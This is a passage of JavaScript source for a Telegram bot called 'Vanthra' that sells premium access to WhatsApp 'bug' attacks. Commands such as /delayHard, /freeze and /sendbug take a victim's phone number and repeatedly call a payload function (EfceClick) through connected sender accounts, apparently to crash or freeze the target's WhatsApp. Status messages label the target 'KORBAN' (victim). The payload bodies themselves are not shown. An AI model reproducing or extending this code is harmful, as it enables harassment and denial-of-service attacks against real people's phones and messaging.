        { text: "Xsettinngs", callback_data: "menu", style: "danger", icon_custom_emoji_id: "6097881360112816903" }
      ],
      [
        { text: "Developers", url: "https://t.me/MbapeGnteng", style: "danger", icon_custom_emoji_id: "6098239916867588854" }
      ]
    ],

    [
      [
        { text: "Xbugs", callback_data: "trashmenu", style: "success", icon_custom_emoji_id: "5350482910883375411" },
        { text: "Xsettinngs", callback_data: "menu", style: "success", icon_custom_emoji_id: "6097881360112816903" }
      ],
      [
        { text: "Developers", url: "https://t.me/MbapeGnteng", style: "success", icon_custom_emoji_id: "6098239916867588854" }
      ]
    ]

  ];

  return colors[Math.floor(Math.random() * colors.length)];
}

function startBlink(chatId, messageId) {

  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
  }

  keyboardIntervals[chatId] = setInterval(async () => {

    try {

      await bot.editMessageReplyMarkup(
        { inline_keyboard: randomColor() },
        {
          chat_id: chatId,
          message_id: messageId
        }
      );

    } catch {}
  }, 1000);
}

function stopBlink(chatId) {

  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
    delete keyboardIntervals[chatId];
  }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

bot.onText(/\/start/, async (msg) => {

  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  const runtime = getBotRuntime();
  const premiumStatus = getPremiumStatus(senderId);

  const developer = "@MbapeGnteng";
  const version = "9.0";
  const platform = "telegram";

  const sent = await bot.sendMessage(chatId, `
\`\`\`javascript
Vanthra
⎔ Developer  : ${developer}
⎔ Version    : ${version}
⎔ Platform   : ${platform}

𝗞𝗘𝗧𝗜𝗞 /MbapeGnteng 𝗨𝗻𝘁𝘂𝗸 𝗠𝗲𝗺𝘂𝗻𝗰𝘂𝗹𝗸𝗮𝗻 𝗠𝗲𝗻𝘂 𝗕𝘂𝘁𝘁𝗼𝗻
𝗞𝗘𝗧𝗜𝗞 help 𝗨𝗻𝘁𝘂𝗸 𝗠𝗲𝗺𝘂𝗻𝗰𝘂𝗹𝗸𝗮𝗻 𝗠𝗲𝗻𝘂 𝗕𝘂𝘁𝘁𝗼𝗻
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ
\`\`\`
`, 
  {
    parse_mode: "Markdown"
  });
});

bot.onText(/\/MbapeGnteng/, async (msg) => {

  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  const runtime = getBotRuntime();
  const premiumStatus = getPremiumStatus(senderId);

  const developer = "@MbapeGnteng";
  const version = "9.0";
  const platform = "telegram";

  const randomImage = getRandomImage();

  const sent = await bot.sendPhoto(chatId, randomImage, {

    caption: `
\`\`\`javascript
Vanthra
⎔ Developer  : ${developer}
⎔ Version    : ${version}
⎔ Platform   : ${platform}

𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍
⎔ Runtime: ${runtime}
⎔ Premium Status: ${premiumStatus}
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: randomColor()
    }
  });
  startBlink(chatId, sent.message_id);
});

// untuk polling

async function sendStartMenu(msg) {
    const chatId = msg.chat.id
    const userId = msg.from.id

    if (userPollData.has(chatId)) {
        const old = userPollData.get(chatId)
        await bot.deleteMessage(chatId, old.videoId).catch(()=>{})
        await bot.deleteMessage(chatId, old.pollId).catch(()=>{})
        userPollData.delete(chatId)
    }

    const username = msg.from.username
        ? `@${msg.from.username}`
        : msg.from.first_name || "User"


    const caption = `
ʜᴀʟᴏ ${username} 👋

ᴍʙᴀᴘᴇ ɴɪʜ ᴅᴇᴋ
ᴠᴇʀsɪᴏɴ : 6.0 ᴘʀᴏ
ᴍᴏᴅᴇ : sʟᴀsʜ ᴄᴏᴍᴍᴀɴᴅ
ʀᴜɴᴛɪᴍᴇ : ${formatRuntime(
        Math.floor((Date.now() - startTime) / 1000)
    )}

𝖯𝗂𝗅𝗂𝗁 𝖬𝖾𝗇𝗎 𝖣𝗂 𝖡𝖺𝗐𝖺𝗁 𝖨𝗇𝗂 👇
    `

    const video = await bot.sendAnimation(
        chatId,
        path.join(__dirname, "メディア", "Mbape.mp4"),
        { caption }
    )

    const poll = await bot.sendPoll(
        chatId,
        "PILIH MENU:",
        [
            "ʙᴜɢ ᴍᴇɴᴜ",
            "ᴏᴡɴᴇʀ ᴍᴇɴᴜ",
            "ᴛᴏᴏʟs",
            "ᴛʜᴀɴᴋs ᴛᴏ"
        ],
        { is_anonymous: false }
    )
    
    await bot.sendAudio(
    chatId,
    fs.createReadStream("audio/Music.mp3"),
    {
        title: "KING",
        performer: "Attack On Titan"
    }
).catch(()=>{})


    userPollData.set(chatId, {
        userId,
        videoId: video.message_id,
        pollId: poll.message_id
    })
}

// Help menu

bot.onText(/^help$/i, async (msg) => {
    const chatId = msg.chat.id

    if (startCooldown.has(chatId)) {
        return bot.sendMessage(chatId, "⏳ Tunggu menu selesai dimuat...")
    }

    startCooldown.add(chatId)

    try {
        await showLoading(chatId, 5000)
        await sendStartMenu(msg)
    } finally {
        setTimeout(() => startCooldown.delete(chatId), 6000)
    }
})

// Callback Polling
bot.on("poll_answer", async (ans) => {
    if (!ans.option_ids?.length) return

    const userId = ans.user.id
    const choice = ans.option_ids[0]

    let chatId, data
    for (const [cid, d] of userPollData.entries()) {
        if (d.userId === userId) {
            chatId = cid
            data = d
            break
        }
    }
    if (!data) return

    await bot.deleteMessage(chatId, data.videoId).catch(()=>{})
    await bot.deleteMessage(chatId, data.pollId).catch(()=>{})
    userPollData.delete(chatId)

    const username = ans.user.username
        ? `@${ans.user.username}`
        : ans.user.first_name || "User"

    let caption = ""
    let keyboard = [
        [{ text: "↺ ʙᴀᴄᴋ", callback_data: "back_to_poll" }]
    ]

    if (choice === 0) {
        caption = `
<blockquote>ʜᴇʟʟᴏ ᴍʏ ғʀɪᴇɴᴅ ${username}</blockquote>

𝖶𝖾𝗅𝖼𝗈𝗆𝖾 𝗍𝗈 𝗌𝖼𝗋𝗂𝗉𝗍 𝗉𝗈𝗅𝗅𝗂𝗇𝗀 𝖻𝗒 @Mbapegntengg

╔─═⊱ KontolBugs
│/delayHard
║/DelayInvis
│/Freeze
┗━━━━━━━━━━━━━━━⬡

╔─═⊱ ANDORID BUGS
│/delay
┗━━━━━━━━━━━━━━━⬡
<blockquote>𝖢𝗈𝗇𝗍𝗈𝗁: /sendbug 628xxx</blockquote>
`
    }

    else if (choice === 1) {
        caption = `
╔─═⊱ Custome Bug
│/sendbug
┗━━━━━━━━━━━━━━⬡
╔─═⊱ AKSES DEVELOPER
│/addowner 
║/delowner 
│/addadmin 
║/deladmin 
│/addprem 
║/delprem
│/setcd 
║/addsender
│/listbot
┗━━━━━━━━━━━━━━⬡
╔─═⊱ AKSES OWNER
│/addadmin
║/deladmin
│/addprem 
║/delprem
│/setcd 
║/addsender
│/listbot
┗━━━━━━━━━━━━━━⬡
╔─═⊱ AKSES ADMIN
│/addprem
║/delprem
│/setcd
║/addsender
│/listbot
┗━━━━━━━━━━━━━━━⬡
`
    }

    else if (choice === 2) {
        caption = `
<blockquote>𝖳𝗈𝗈𝗅𝗌 𝟣/𝟤</blockquote>
✙ /ssip
✙ /tiktokdl
✙ /uploadghp
✙ /chatai
✙ /getcode
✙ /play
`
        keyboard = [
            [{ text: "ɴᴇxᴛ ➜", callback_data: "tools_p2" },
            { text: "↺ ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "back_to_poll" }]
        ]
    }

    /* ===== THANKS TO ===== */
    else if (choice === 3) {
        caption = `
<blockquote>THANKS TO</blockquote>
<b>✙ ᴍʙᴀᴘᴇ ( 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 )</b>
<b>✙ sᴀɴᴢ ( 𝖥𝗋𝗂𝖾𝗇𝖽 )</b>
`
    }

    await bot.sendAnimation(
        chatId,
        path.join(__dirname, "メディア", "Mbape.mp4"),
        {
            caption,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        }
    )
})


// CALLBACK help sama MbapeGnteng
bot.on("callback_query", async (query) => {

  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;
  
  const developer = "@MbapeGnteng";
  const version = "9.0";
  const platform = "telegram";

  await bot.answerCallbackQuery(query.id);

  let caption = "";
  let keyboard = [];


   if (query.data === "back_to_poll") {
    return sendStartMenu({
      chat: query.message.chat,
      from: query.from
    });
  }

  if (query.data === "tools_p1") {
    return bot.sendAnimation(
      chatId,
      path.join(__dirname, "メディア", "Mbape.mp4"),
      {
        caption: `
<blockquote>𝖳𝗈𝗈𝗅𝗌 𝟣/𝟤</blockquote>
✙ /ssip
✙ /tiktokdl
✙ /uploadghp
✙ /chatai
✙ /getcode
✙ /play
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "ɴᴇxᴛ ➜", callback_data: "tools_p2" },
              { text: "↺ ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "back_to_poll" }
            ]
          ]
        }
      }
    );
  }

  if (query.data === "tools_p2") {
    return bot.sendAnimation(
      chatId,
      path.join(__dirname, "メディア", "Mbape.mp4"),
      {
        caption: `
<blockquote>𝖳𝗈𝗈𝗅𝗌 𝟤/𝟤</blockquote>
✙ /ipinfo
✙ /cekjodoh
✙ /ceindo
✙ /tohd
✙ /tiktoksearch
`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⬅ ʙᴀᴄᴋ", callback_data: "tools_p1" },
              { text: "↺ ʙᴀᴄᴋ ᴛᴏ ᴍᴇɴᴜ", callback_data: "back_to_poll" }
            ]
          ]
        }
      }
    );
  }

  if (query.data === "trashmenu") {

    stopBlink(chatId);

    caption = `
\`\`\`javascript
Vanthra

╔─═⊱ KontolBugs
│/delayHard
║/DelayInvis
│/Freeze
┗━━━━━━━━━━━━━━━⬡

╔─═⊱ ANDORID BUGS
│/delay
┗━━━━━━━━━━━━━━━⬡
\`\`\`
`;

    keyboard = [
      [
        { text: "Next", callback_data: "trashmenu2" },
        { text: "Back", callback_data: "back_to_main" }
      ]
    ];

  }


  else if (query.data === "trashmenu2") {

    stopBlink(chatId);

    caption = `
\`\`\`javascript
Vanthra

╔─═⊱ KontolBugs
│/delayHard
║/DelayInvis
│/Freeze
┗━━━━━━━━━━━━━━━⬡

╔─═⊱ ANDORID BUGS
│/delay
┗━━━━━━━━━━━━━━━⬡
\`\`\`
`;

    keyboard = [
      [
        { text: "Back", callback_data: "trashmenu" }
      ]
    ];

  }


  else if (query.data === "menu") {

    stopBlink(chatId);

    caption = `
\`\`\`javascript
Vanthra
⎔ Developer  : ${developer}
⎔ Version    : ${version}
⎔ Platform   : ${platform}
⎔ type script : Bebas spam bugs 

╔─═⊱ Custome Bug
│/sendbug
┗━━━━━━━━━━━━━━⬡
╔─═⊱ AKSES DEVELOPER
│/addowner 
║/delowner 
│/addadmin 
║/deladmin 
│/addprem 
║/delprem
│/setcd 
║/addsender
│/listbot
┗━━━━━━━━━━━━━━⬡
╔─═⊱ AKSES OWNER
│/addadmin
║/deladmin
│/addprem 
║/delprem
│/setcd 
║/addsender
│/listbot
┗━━━━━━━━━━━━━━⬡
╔─═⊱ AKSES ADMIN
│/addprem
║/delprem
│/setcd
║/addsender
│/listbot
┗━━━━━━━━━━━━━━━⬡
\`\`\`
`;

    keyboard = [
      [
        { text: "Back", callback_data: "back_to_main" }
      ]
    ];

  }


  else if (query.data === "back_to_main") {

    const runtime = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);

    caption = `
\`\`\`javascript
Vanthra
⎔ Developer  : ${developer}
⎔ Version    : ${version}
⎔ Platform   : ${platform}

𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍
⎔ Runtime: ${runtime}
⎔ Premium Status: ${premiumStatus}
# sᴇʟᴇᴄᴛ ᴛʜᴇ ʙᴜᴛᴛᴏɴ ᴛᴏ sʜᴏᴡ ᴍᴇɴᴜ
\`\`\`
`;

    keyboard = randomColor();

    await bot.editMessageCaption(caption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: keyboard }
    });

    startBlink(chatId, messageId);

    return;
  }

  await bot.editMessageCaption(caption, {
    chat_id: chatId,
    message_id: messageId,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: keyboard }
  });

});
//=======CASE BUG=========//
bot.onText(/\/delayHard (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  


  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "BUY AKSES DULU SONO SAMA DK IMUT",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/MbapeGnteng" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Kirim foto dengan caption proses (tombol merah)
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
# PROSES KIRIM BUG

◇ OWNER : @MbapeGnteng
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : DELAY HARD
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
      },
    });

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 100; i++) {
      await EfceClick(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit caption foto menjadi sukses (tombol hijau)
    await bot.editMessageCaption(
      `\`\`\`
# SUKSES KIRIM BUG

◇ OWNER : @MbapeGnteng
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : DELAY HARD
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayInvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "BUY AKSES DULU SONO SAMA DK IMUT",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/MbapeGnteng" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    if (cooldown > 0) {
      return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    // Kirim foto dengan caption proses (tombol merah)
    const sentMessage = await bot.sendPhoto(chatId, randomImage, {
      caption: `\`\`\`
# PROSES KIRIM BUG

◇ OWNER : @MbapeGnteng
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : DELAY INVIS
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
      },
    });

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 100; i++) {
      await EfceClick(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit caption foto menjadi sukses (tombol hijau)
    await bot.editMessageCaption(
      `\`\`\`
# SUKSES KIRIM BUG

◇ OWNER : @MbapeGnteng
◇ PENGIRIM BUG : @${msg.from.username || "unknown"}
◇ EFEK BUG : DELAY INVIS
◇ KORBAN : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT
\`\`\``,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


//===== CASE BUG ANDRO BEBAS SPAM ======//
bot.onText(/\/freeze (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  

  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `BUY AKSES DULU SONO SAMA DK IMUT`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/MbapeGnteng", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`js
# 𝙋𝙍𝙊𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FREEZE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 60; i++) {
      await EfceClick(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`js
# 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : FREEZE
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delay (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const userId = msg.from.id;
  const cooldown = checkCooldown(userId);
  


  if (cooldown > 0) {
    return bot.sendMessage(chatId, `Jeda dulu ya kakakk! ${cooldown} .`);
  }

  if (!premiumUsers.some((user) => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `BUY AKSES DULU SONO SAMA DK IMUT`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/MbapeGnteng", style: "primary" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx");
    }

    // Kirim pesan proses (tombol merah)
    const sentMessage = await bot.sendMessage(
      chatId,
      `
\`\`\`js
# 𝙋𝙍𝙊𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "PROCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "danger" }]],
        },
      }
    );

    let count = 0;
    console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 60; i++) {
      await EfceClick(sock, jid);
      await sleep(300);
      console.log(chalk.red(`[ALTEIR] BUG Processing ${count}/100 Loop ke ${formattedNumber}`));
      count++;
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    // Edit pesan menjadi sukses (tombol hijau)
    await bot.editMessageText(
      `
\`\`\`js
# 𝙎𝙐𝙆𝙎𝙀𝙎 𝙆𝙄𝙍𝙄𝙈 𝘽𝙐𝙂

◇ 𝐎𝐖𝐍𝐄𝐑 : @MbapeGnteng
◇ 𝐏𝐄𝐍𝐆𝐈𝐑𝐈𝐌 𝐁𝐔𝐆 : @${msg.from.username || "unknown"}
◇ 𝐄𝐅𝐄𝐊 𝐁𝐔𝐆 : DELAY
◇ 𝐊𝐎𝐑𝐁𝐀𝐍 : ${formattedNumber}
NOTE: JEDA 20 MENIT AGAR SENDER BUG TIDAK CEPET COPOT/OVERHEAT\`\`\`
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[{ text: "SUCCESS BUG❗", url: `https://wa.me/${formattedNumber}`, style: "success" }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});


// Customr BUG
function createBugSuccessMessage(targetNumber, bugType, date) {
    return `
<blockquote>⬡═―—⊱「 MBAPE NIH 」⊰―—═⬡</blockquote>

◉ Target : ${targetNumber}
◉ Type Bug : ${bugType}
◉ Status : Successfully Send
◉ Date Now : ${date}

<blockquote>⸙ Spam Free at will</blockquote>`
}

function createCheckButton(targetNumber) {
    return {
        inline_keyboard: [
            [{ text: "⌜📱⌟ ☇ チェック", url: `https://wa.me/${targetNumber}` }]
        ]
    }
}

bot.onText(/\/sendbug(?:\s+(\d+))?/, async (msg, match) => {
  try {
    const chatId = msg.chat.id
    const senderId = msg.from.id // Menggunakan senderId secara konsisten
    const randomImage = getRandomImage();
    
    if (
      !premiumUsers.some(
        (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
      )
    ) {
      return bot.sendPhoto(chatId, randomImage, {
        caption: `\nBUY AKSES DULU SONO SAMA DK IMUT\n`,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "𝐎𝐖𝐍𝐄𝐑", url: "https://t.me/MbapeGnteng" }],
          ],
        },
      });
    }

    if (!match || !match[1]) {
      return bot.sendMessage(
        chatId,
        "🪧 ☇ Format Valid : /sendbug 628xxx",
        {
          parse_mode: "HTML",
          reply_to_message_id: msg.message_id
        }
      )
    }

    const targetNumber = match[1]
    const formattedNumber = targetNumber.replace(/[^0-9]/g, "")
    const target = `${formattedNumber}@s.whatsapp.net`

    // Perbaikan: Ganti fromId menjadi senderId agar tidak undefined
    const cooldown = checkCooldown(senderId)
    if (cooldown > 0) {
      return bot.sendMessage(
        chatId,
        `⏰ ☇ Tunggu ${cooldown} detik sebelum mengirim lagi.`,
        { reply_to_message_id: msg.message_id }
      )
    }

    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ ☇ Tidak ada bot Whatsapp",
        { reply_to_message_id: msg.message_id }
      )
    }

const pollData = {
  targetNumber: formattedNumber,
  target: target,
  chatId: chatId,
  messageId: null,
  fromId: senderId
};
global.userPollData.set(senderId, pollData);


    const caption = `
<blockquote>SELECT TYPE BUG</blockquote>

◉ Target : ${formattedNumber}
◉ Status : Select Type Bug Dibawah

<blockquote>Note : Setelah Lewat 10 Menit Otomatis Default Ke Type ForceVC</blockquote>`

    const pollMessage = await bot.sendPoll(
      chatId,
      caption,
      ["ForceVC", "ForceCall", "DelayInvis", "Stuckhome", "ForceIPhone"],
      {
        is_anonymous: false,
        allows_multiple_answers: false,
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      }
    )
    
    const data = global.userPollData.get(senderId);
   data.messageId = pollMessage.message_id;
   data.pollId = pollMessage.poll.id;
   global.userPollData.set(senderId, data);

    const pollChatId = chatId
    const pollMessageId = pollMessage.message_id
    const pollTargetNumber = formattedNumber
    const pollTarget = target
    const pollUserId = senderId
    const savedPollId = pollMessage.poll.id

    setTimeout(async () => {
      try {
        const userData = global.userPollData?.get(pollUserId)
        if (!userData || userData.pollId !== savedPollId) {
          return
        }
        
        const date = getCurrentDate()
        const endCaption = `
<blockquote>⸙ POLLING SELESAI</blockquote>

◉ Target : ${pollTargetNumber}
◉ Status : Waktu habis, menggunakan pilihan default: FORCEVC
◉ Action : Sending Bug...`

        const pollEndMsg = await bot.sendMessage(pollChatId, endCaption, {
          parse_mode: "HTML",
          reply_to_message_id: pollMessageId
        })

        const sendingCaption = `
<blockquote>⸙ SENDING BUG</blockquote>

◉ Bug Type : FORCEVC
◉ Target : ${pollTargetNumber}
◉ Status : Processing...`

        const sendingMsg = await bot.sendMessage(pollChatId, sendingCaption, {
          parse_mode: "HTML"
        })

        setTimeout(async () => {
          try {
            await bot.deleteMessage(pollChatId, pollEndMsg.message_id)
            await bot.deleteMessage(pollChatId, sendingMsg.message_id)
          } catch (deleteErr) {}
        }, 1000)

        global.userPollData.delete(pollUserId)
        await handleForceVC(pollChatId, pollMessageId, pollTargetNumber, pollTarget, date, pollUserId)

      } catch (err) {
        console.error("Poll timer error:", err)
      }
    }, 600000)

  } catch (err) {
    bot.sendMessage(msg.chat.id, `❌ ☇ Error : ${err.message}`, { reply_to_message_id: msg.message_id })
  }
})

bot.on('poll_answer', async (pollAnswer) => {
  try {
    const fromId = pollAnswer.user.id
    const pollId = pollAnswer.poll_id
    const optionIds = pollAnswer.option_ids

    let foundUserData = null
    let foundUserId = null
    
